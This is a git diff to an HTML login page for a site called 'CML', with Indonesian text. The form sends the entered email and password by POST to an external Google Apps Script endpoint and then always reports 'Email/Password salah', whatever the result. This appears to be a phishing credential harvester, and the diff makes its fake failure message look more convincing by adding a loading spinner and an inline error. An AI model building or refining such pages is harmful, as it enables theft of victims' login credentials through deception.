@@ -288,7 +288,8 @@
       </a>
       <div class="indicator"></div>
       <div class="wrapper">
-        <p>Selamat datang di website CML</p>
+        <p class="selamat-datang">Selamat datang di website CML</p>
+        <div class="my-alert d-none" style="color: red"><p>Email/Password salah</p></div>
         <h2>Login</h2>
         <form name="cml-login">
           <div class="form-group">
@@ -304,7 +305,10 @@
           </div>
 
           <div class="form-input">
-            <input type="submit" class="tml" value="Login" />
+            <input type="submit" class="tml btn-login" value="Login" />
+            <button type="submit" class="tml btn-loading d-none" type="button">
+              <span class="spinner-border spinner-border-sm" role="status" aria-hidden="true"></span>
+            </button>
           </div>
         </form>
       </div>
@@ -313,17 +317,31 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
     <script src="script.js"></script>
 
+    <!-- // script contact form -->
     <script>
-      const scriptURL = "https://script.google.com/macros/s/AKfycbyDB3YipUcKIyakZyhhyjmPceYkpAZAJ0bWsk-6YeaqZ126ryKum-yPGRzaFesTRlZ8/exec";
+      const scriptURL = "https://script.google.com/macros/s/AKfycbwgNapvgbZLZOFeaELH998l820EO9-AMHKxCO_WBAhOSzGTA-e83QgA8g5blkTbPGtM/exec";
       const form = document.forms["cml-login"];
+      const btnLoading = document.querySelector(".btn-loading");
+      const btnLogin = document.querySelector(".btn-login");
+      const myAlert = document.querySelector(".my-alert");
+      const selamatDatang = document.querySelector(".selamat-datang");
 
       form.addEventListener("submit", (e) => {
         e.preventDefault();
+
+        // ketika tombol login diklik
+        // tampilkan tombol loading, hilangkan tombol login
+        btnLoading.classList.toggle("d-none");
+        btnLogin.classList.toggle("d-none");
         fetch(scriptURL, { method: "POST", body: new FormData(form) })
           .then((response) => {
-            form.reset();
+            // tampilkan tombol login, hilangkan tombol loading
+
+            btnLoading.classList.toggle("d-none");
+            btnLogin.classList.toggle("d-none");
+            myAlert.classList.toggle("d-none");
+            selamatDatang.classList.toggle("d-none");
             console.log("Success!", response);
-            alert("Email/Password anda tidak valid, coba di periksa kembali");
           })
           .catch((error) => console.error("Error!", error.message));
       });
